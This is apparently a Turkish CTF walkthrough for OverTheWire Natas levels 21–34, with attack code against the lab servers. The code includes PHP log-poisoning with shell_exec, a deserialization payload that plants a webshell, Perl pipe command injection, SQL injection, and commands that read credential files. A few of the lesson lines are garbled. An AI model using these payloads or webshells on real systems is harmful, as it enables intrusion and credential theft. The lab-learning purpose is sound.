# 🌐 OverTheWire: Natas — Level 21'den Level 34'e Türkçe Rehber

> Son ve en zorlu bölüm. Cross-site session paylaşımı, PHP type juggling,  
> deserialization, LFI + log poisoning, MySQL truncation, ECB şifre kırma,  
> ve Perl'e özgü açıklar seni bekliyor.

**Önceki bölüm:** [natas_11-20.md](./natas_11-20.md)  
**Referans:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-21-24/)

---

## 🗺️ Genel Bakış

| Level | Konu | Teknik |
|---|---|---|
| 21 → 22 | Cross-site session paylaşımı | Experimenter sitesinde session oluştur |
| 22 → 23 | PHP redirect bypass | curl ile redirect'i atla |
| 23 → 24 | PHP type juggling (string > int) | `11iloveyou` |
| 24 → 25 | `strcmp()` array bypass | `passwd[]` dizisi ile NULL döndür |
| 25 → 26 | LFI + Log Poisoning | `....//` bypass + User-Agent injection |
| 26 → 27 | PHP object deserialization | Logger sınıfını serialize et |
| 27 → 28 | MySQL varchar truncation | `natas28` + boşluk ile duplicate user |
| 28 → 29 | ECB şifre kırma | Block cipher byte shifting |
| 29 → 30 | Perl `open()` RCE | `|komut` ile pipe injection |
| 30 → 31 | Perl DBI `quote()` bypass | Array tipi ile SQLi |
| 31 → 32 | Perl Jam 2 / CGI `ARGV` | File upload + query string RCE |
| 32 → 33 | Perl Jam 2 (devam) | `./getpassword` binary çalıştır |
| 33 → 34 | MD5 / PHP file upload + hash bypass | Phar deserialize veya hash collision |

---

## Level 21 → Level 22 — Cross-Site Session Paylaşımı

### 🎯 Görev
İki site var: ana site ve `experimenter`. Experimenter'da `admin=1` session'ı oluşturup ana siteye taşı.

### 📖 Teori
İki site aynı session backend'ini paylaşıyor. Experimenter sitesinde herhangi bir parametre session'a yazılabiliyor — güvenlik kontrolü yok!

### 🔧 Çözüm

```python
import requests

auth = ("natas21", "<şifre>")

# 1. Experimenter'a admin=1 gönder, PHPSESSID al
r1 = requests.get(
    "http://natas21-experimenter.natas.labs.overthewire.org/",
    params={"admin": "1", "submit": "Update"},
    auth=auth
)
phpsessid = r1.cookies['PHPSESSID']

# 2. Aynı PHPSESSID ile ana siteye git
r2 = requests.get(
    "http://natas21.natas.labs.overthewire.org/",
    auth=auth,
    cookies={"PHPSESSID": phpsessid}
)
print(r2.text)  # şifre burada
```

> 💡 **Ders:** Session'ı paylaşan uygulamalar birbirinin güvenlik açıklarından etkilenir. Her site kendi session'ını bağımsız doğrulamalı.

---

## Level 22 → Level 23 — PHP Redirect Bypass (curl)

### 🎯 Görev
`?revelio` parametresi şifreyi gösteriyor ama admin değilsen direkt redirect yapıyor. Redirect'i atla.

### 📖 Teori
PHP `header("Location: /")` redirect'i tarayıcılar otomatik takip eder. Ama `curl` varsayılan olarak takip etmez ve redirect öncesi response body'yi gösterir!

### 🔧 Çözüm

```bash
curl -s -u natas22:<şifre> \
  "http://natas22.natas.labs.overthewire.org/?revelio"
# Redirect öncesi HTML döner → şifre içinde
```

> 💡 **Ders:** Güvenlik kontrolü redirect'ten önce değil, redirect'ten **önce** içerik gönderilmemeli. `exit` ya da `die` kullanılmalı.

---

## Level 23 → Level 24 — PHP Type Juggling

### 🎯 Görev
```php
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10))
```
Hem "iloveyou" içermeli hem de 10'dan büyük olmalı.

### 📖 Teori: PHP'de String-Integer Karşılaştırması

PHP'de bir string ile integer karşılaştırılırken, string sayısal değeri **başındaki rakamlardan** okunur:
```php
"11iloveyou" > 10  → true  (11 > 10)
"iloveyou" > 10    → false (0 > 10)
```

### 🔧 Çözüm
```
Forma yaz: 11iloveyou
→ strstr("11iloveyou", "iloveyou") = true ✓
→ "11iloveyou" > 10 → 11 > 10 = true ✓
→ Şifre verilir
```

> 💡 **Ders:** PHP'nin zayıf tip sistemi (loose typing) güvenlik açıklarına yol açar. `===` (strict comparison) kullan, `==` değil.

---

## Level 24 → Level 25 — strcmp() Array Bypass

### 🎯 Görev
```php
if(!strcmp($_REQUEST["passwd"], "<gizli_şifre>"))
```
`strcmp()` fonksiyonunu atlatmak gerekiyor.

### 📖 Teori: PHP strcmp() ile Array

PHP'de `strcmp()` bir string yerine **array** alırsa `NULL` döner. `!NULL` → `true`!

```php
strcmp([], "abc")  → NULL
!NULL              → true
```

### 🔧 Çözüm
```
URL'ye git:
http://natas24.natas.labs.overthewire.org/?passwd[]=anything

→ passwd[] array olur → strcmp NULL döner → !NULL = true → şifre verilir
```

> 💡 **Ders:** PHP'de tip kontrolü olmadan `strcmp()` kullanmak tehlikeli. `=== 0` yerine `strcmp` sonucunu kontrol etmek gerekli.

---

## Level 25 → Level 26 — LFI + Log Poisoning

### 🎯 Görev
Dil parametresi (`?lang=`) `../` filtreliyor ve `natas_webpass` engelliyor. İki açığı birleştir: directory traversal bypass + log poisoning.

### 📖 Teori

**`....//` bypass:** `str_replace("../", "")` sadece bir geçiş yapar:
```
....//  →  str_replace kaldırır ../  →  ../  ← istedğimiz buydu!
```

**Log Poisoning:** Log dosyası User-Agent'ı kaydediyor. User-Agent'a PHP kodu yazarsak, log dosyası include edildiğinde kod çalışır!

### 🔧 Çözüm

**Adım 1 — PHPSESSID'yi al:**
```
F12 → Application → Cookies → PHPSESSID değerini kopyala
```

**Adım 2 — Burp Suite/curl ile User-Agent'a PHP kodu yaz:**
```bash
curl -s -u natas25:<şifre> \
  "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_SESSIONID.log" \
  -H 'User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
```

**Adım 3 — `....//` ile log dosyasını include et:**
```
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

Log dosyasında PHP kodu çalışır → şifre görünür.

> 💡 **Ders:** Log dosyaları asla web'e erişilebilir olmamalı. User input log'a yazılmadan sanitize edilmeli.

---

## Level 26 → Level 27 — PHP Object Deserialization

### 🎯 Görev
Çizgi çizen bir uygulama var. Cookie'deki serialize edilmiş `Logger` nesnesini manipüle et.

### 📖 Teori: PHP Object Deserialization

PHP `unserialize()` ile cookie'deki veriyi nesneye dönüştürüyor. `Logger` sınıfının `__destruct()` methodu — nesne imha edildiğinde çalışır. `$exitMsg` ve `$logFile` değerlerini değiştirirsek, şifreyi istediğimiz yere yazabiliriz!

```php
class Logger {
    private $logFile;
    private $exitMsg;
    
    function __destruct() {
        // exitMsg'i logFile'a yazar
        file_put_contents($this->logFile, $this->exitMsg);
    }
}
```

### 🔧 Çözüm

PHP sandbox'ta (örn. 3v4l.org) çalıştır:
```php
<?php
class Logger {
    private $logFile = "/var/www/natas/natas26/img/shell.php";
    private $exitMsg = "<?php echo shell_exec(\$_GET['e']); ?>";
}

$logger = new Logger();
echo base64_encode(serialize($logger));
```

Çıkan base64'ü `drawing` cookie'sine yaz → sayfa yüklendiğinde `__destruct()` shell.php'yi yazar:
```
http://natas26.natas.labs.overthewire.org/img/shell.php?e=cat /etc/natas_webpass/natas27
```

> 💡 **Ders:** Kullanıcı verisi asla `unserialize()` ile işlenmemeli. JSON kullan.

---

## Level 27 → Level 28 — MySQL VARCHAR Truncation

### 🎯 Görev
`natas28` kullanıcısı olarak login ol — ama şifresini bilmiyorsun.

### 📖 Teori: MySQL VARCHAR Overflow

MySQL `VARCHAR(64)` alanı 64 karakterden fazlasını truncate eder. Eğer `"natas28" + 57 boşluk + "x"` kullanıcı adıyla kayıt olursak:
- `validUser("natas28" + boşluklar + "x")` → bulunamaz → yeni user oluştur
- MySQL truncate eder → `"natas28"` olarak kaydeder (boşluklar trim edilir)
- Şimdi `natas28` + kendi şifremizle login → `dumpData("natas28")` → gerçek natas28'in verisini döker!

### 🔧 Çözüm

```python
import requests

auth = ("natas27", "<şifre>")
url = "http://natas27.natas.labs.overthewire.org/"

# 1. natas28 + 57 boşluk + "x" ile kayıt ol
username = "natas28" + " " * 57 + "x"
requests.post(url, data={"username": username, "password": "mypass"}, auth=auth)

# 2. "natas28" + kendi şifremizle login
r = requests.post(url, data={"username": "natas28", "password": "mypass"}, auth=auth)
print(r.text)  # natas28'in verisi → şifre içinde
```

> 💡 **Ders:** Kullanıcı adı benzersizliği uygulama katmanında da kontrol edilmeli. DB truncation'a güvenme.

---

## Level 28 → Level 29 — ECB Şifre Kırma

### 🎯 Görev
Arama sorgusu şifreli gönderiliyor (ECB modu). Şifrelenmiş SQL injection payload'ı oluştur.

### 📖 Teori: ECB (Electronic Codebook) Mode

ECB şifreleme her bloğu bağımsız şifreler. Aynı plaintext bloğu → her zaman aynı ciphertext. Bu zayıflıkla şifreli blokları keserek yapıştırabiliriz!

```
Plaintext: [PREPEND_TEXT][OUR_INPUT][PADDING]
Encrypted: [Block1][Block2][Block3]

Blokları yeniden düzenleyerek farklı bir plaintext oluşturabiliriz!
```

### 🔧 Çözüm (Konsept)

1. Boş arama yap → baseline şifreli değeri al
2. Farklı uzunluklarda input göndererek blok boyutunu tespit et (32 byte artar → 16 byte'lık bloklar)
3. Input'u öyle ayarla ki SQL injection payload'ı tam bir bloğa denk gelsin
4. O bloğu baseline'daki PREPEND bloğuyla birleştir

Ayrıntılı Python implementasyonu için: [blog.sudarshandevkota.com.np](https://blog.sudarshandevkota.com.np/overthewire-natas-walkthrough)

> 💡 **Ders:** ECB modu güvenli değildir. CBC veya GCM kullan.

---

## Level 29 → Level 30 — Perl `open()` RCE

### 🎯 Görev
Perl uygulaması `open(FD, "$f.txt")` ile dosya açıyor. "natas" içeren stringler filtreliyor. Komut çalıştır.

### 📖 Teori: Perl open() Güvenlik Açığı

Perl'de `open(FD, "|komut")` komutu çalıştırır! Pipe karakteri `|` ile dosya adı yerine komut çalıştırılabilir.

"natas" filtresi varsa wildcard kullan:
```
/etc/na?as_webpass/na?as30   →  natas'ı bypass eder!
```

### 🔧 Çözüm

```
URL:
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na%3Fas_webpass/na%3Fas30%00

%3F = ?
%00 = null byte (dosya uzantısını kes)
```

Veya:
```
?file=|cat /etc/*_webpass/*30
```

> 💡 **Ders:** Perl'de `open()` ile kullanıcı girdisi kullanma. `sysopen()` veya whitelist kullan.

---

## Level 30 → Level 31 — Perl DBI `quote()` Array Bypass

### 🎯 Görev
Perl `$dbh->quote(param("password"))` SQL injection'ı engellemeye çalışıyor. Array göndererek bypass et.

### 📖 Teori: Perl CGI param() ile Array

`param("password")` **liste bağlamında** birden çok değer döndürebilir. `password`'ü iki kez gönderirsen (`password=X&password=Y`), `param("password")` → `("X", "Y")` listesi döner.

`$dbh->quote(param("password"))` → `quote("X", "Y")` çağrısına düzleşir. **DBI'da `quote()`'un 2. argümanı bir SQL veri tipidir (`$data_type`).** Sayısal bir tip verilince `quote()` değeri **tırnaksız** döndürür (base implementasyondaki `unless ($data_type)` koruması atlanır) → SQLi'ya kapı açılır. (Not: CGI `param()`'ın 2. argümanı bir "tip" değildir; hile, listenin ikinci elemanının `quote()`'a *veri tipi* olarak geçmesidir.)

```perl
$dbh->quote(param('password'))
# param('password') → ("1 OR 1=1", 1)  → quote(değer, tip) → "1 OR 1=1" TIRNAKSIZ gömülür
# (1. eleman = zararlı SQL değeri; 2. eleman = sayısal veri tipi, ör. 4=SQL_INTEGER)
```

### 🔧 Çözüm

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas30", "<şifre>")
url = "http://natas30.natas.labs.overthewire.org/"

# password'ü iki kez gönder: 1) zararlı SQL DEĞERİ, 2) sayısal veri tipi (quote'u devre dışı bırakır)
response = requests.post(url,
    data=[
        ("username", "natas31"),
        ("password", "1 OR 1=1"),   # 1. eleman: değer → quote tırnaksız gömer
        ("password", "1")           # 2. eleman: sayısal tip (truthy) → tırnaklama atlanır
    ],
    auth=auth
)
print(response.text)
```

> 💡 **Ders:** Perl CGI'da `param()` list context'te array döner. DBI quote() bunu yanlış işler.

---

## Level 31 → Level 32 — Perl Jam 2 / CGI ARGV

### 🎯 Görev
Perl CGI dosya yükleme uygulaması. "Perl Jam 2" açığını kullanarak RCE elde et.

### 📖 Teori: Perl CGI ARGV Açığı

Perl CGI'da `upload()` list context'te çağrılırsa, `ARGV` adlı bir parametre özel anlam taşır — komut satırı argümanı gibi davranır. Bu, URL query string'ini `open()` için komut olarak çalıştırmaya olanak tanır!

```perl
# Aslında bunu yapıyor:
open(FD, "dosyaadi")
# Ama ARGV hilesiyle:
open(FD, "ls . |")   → komut çalışır!
```

### 🔧 Çözüm

```python
import requests

auth = ("natas31", "<şifre>")
url = "http://natas31.natas.labs.overthewire.org/index.pl"

# 1. Önce ls ile binary'yi bul
response = requests.post(
    url + "?ls . |",
    files=[('file', ('test.txt', 'test'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(response.text)  # getpassword binary görünür

# 2. Binary'yi çalıştır
response = requests.post(
    url + "?/usr/bin/cat /etc/natas_webpass/natas32 |",
    files=[('file', ('test.txt', 'test'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(response.text)
```

---

## Level 32 → Level 33 — Perl Jam 2 (Devam) + getpassword Binary

### 🎯 Görev
Önceki level gibi ama şifre dosyasına direkt erişim yok — özel bir `getpassword` binary'si çalıştırman gerekiyor.

### 🔧 Çözüm

```python
import requests

auth = ("natas32", "<şifre>")
url = "http://natas32.natas.labs.overthewire.org/index.pl"

# 1. getpassword binary'sini bul
r = requests.post(
    url + "?ls . |",
    files=[('file', ('x', 'x'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(r.text)  # getpassword listede

# 2. Çalıştır
r = requests.post(
    url + "?./getpassword | xargs echo |",
    files=[('file', ('x', 'x'))],
    data={'file': 'ARGV'},
    auth=auth
)
print(r.text)  # şifre burada
```

---

## Level 33 → Level 34 — PHP MD5 Hash & Phar Deserialization

### 🎯 Görev
Dosya yükleme var. MD5 hash kontrolü yapılıyor. Phar deserialization ile bypass et.

### 📖 Teori: Phar Deserialization

PHP `phar://` stream wrapper'ı Phar arşivlerini açar. Phar dosyaları meta verisinde serialize edilmiş PHP nesneleri içerir. `file_get_contents("phar://dosya")` gibi bir çağrı, bu nesneleri otomatik deserialize eder!

Phar dosyasının MD5'i kontrol edilse de, dosya meta verisindeki nesne deserialize edilirken `__destruct()` çalışır → şifreye erişim!

### 🔧 Çözüm (Konsept)

1. `Executor` sınıfını içeren bir PHP scripti yaz
2. `phar` arşivi oluştur, serialize et
3. Arşivi yükle (herhangi bir isimle — .png bile olur)
4. MD5 bypass: dosyanın başına istenen hash'i içeren özel bir string ekle
5. Server phar'ı deserialize ederken `__destruct()` çalışır

Ayrıntılı implementasyon için: [learnhacking.io Natas 33](https://learnhacking.io/)

---

## 🏁 Tebrikler — Natas Tamamlandı!

```
Level 34 → Oyun bitti!
Natas'ı tamamladın — web güvenliğinin en kapsamlı CTF serisinden biri.
```

---

## 📚 Öğrenilen Kavramlar Özeti (Level 21-34)

| Kavram | Açıklama |
|---|---|
| **Cross-site Session** | İki site aynı session backend paylaşırsa → cross-contamination |
| **PHP Redirect Bypass** | curl redirect'i otomatik takip etmez |
| **Type Juggling** | PHP'de `"11text" > 10` → `true` |
| **strcmp() Array** | `strcmp([], "x")` → `NULL` → `!NULL` = `true` |
| **LFI + Log Poisoning** | Traversal ile log'a erişim + User-Agent injection |
| **PHP Deserialization** | `unserialize()` ile `__destruct()` tetikleme |
| **MySQL Truncation** | VARCHAR sınırını aşarak duplicate user oluşturma |
| **ECB Mode Attack** | Aynı plaintext → aynı ciphertext → blok manipülasyonu |
| **Perl open() RCE** | `|komut` ile pipe mode |
| **Perl DBI Array** | `param()` array → `quote()` bypass |
| **Perl Jam 2** | CGI ARGV + upload → query string RCE |
| **Phar Deserialization** | `phar://` stream wrapper ile nesne deserialize |

---

## 🔗 Faydalı Kaynaklar

- [OverTheWire Natas](https://overthewire.org/wargames/natas/)
- [LearnHacking.io Natas](https://learnhacking.io/) (25-31 arası)
- [JamesCao Natas 21-24](https://jameskaois.com/posts/overthewire-natas-level-21-24/)
- [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [Perl Jam 2 Presentation](https://www.youtube.com/watch?v=tBqHEJMalRE)
- [ECB Mode Weakness](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#ECB)
- [PHP Type Juggling Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md)
- [CyberChef](https://gchq.github.io/CyberChef/)

---

**Önceki bölüm:** [natas_11-20.md](./natas_11-20.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
